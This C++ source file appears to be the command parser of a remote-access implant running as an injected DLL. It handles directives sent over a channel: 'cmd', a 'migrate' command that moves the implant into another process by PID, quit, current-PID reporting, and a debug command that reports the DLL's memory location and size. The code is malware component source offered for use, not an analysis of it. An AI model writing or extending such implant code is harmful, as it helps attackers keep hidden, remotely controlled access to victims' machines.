#include "sopar.h"

extern "C" void sprintf(char *buf, const char *fmt, ...);

#include "../dll/exports.h"

extern struct DllMeta_ DllMeta;

void sopar::parse()
{
    char *it = this->buf;
    while(*it && (*it != ' ')){
        it++;
    }
    
    *it = '\0';
    
    if(it == this->buf)
    {
        return;
    }
    else if(!strcmp(this->buf, "cmd"))
    {
        this->sopar_send("executing cammand: ");
        this->sopar_send(it + 1);
        this->sopar_send("\n");
        return;
    }
    else if(!strcmp(this->buf, "migrate"))
    {
        this->sopar_send("migrating to process ");
        this->sopar_send(it + 1);
        this->sopar_send("\n");
        Migrate(atoi(it + 1));
        this->cleanup();
    }
    else if(!strcmp(this->buf, "quit"))
    {
        this->cleanup();
        return;
    }
    else if(!strcmp(this->buf, "currentpid"))
    {
        sprintf(this->buf, "Currently in Process %u\n", GetCurrentProcessId());
        this->sopar_send(this->buf);
        return;
    }
    else if(!strcmp(this->buf, "debuginfo"))
    {
        sprintf(this->buf, "location: %llx\nsize: %llx\n", DllMeta.where, DllMeta.size);
        this->sopar_send(this->buf);
        return;
    }
    else
    {
        this->sopar_send("undefined directive: ");
        this->sopar_send(this->buf);
        this->sopar_send("\n");
        return;
    }
}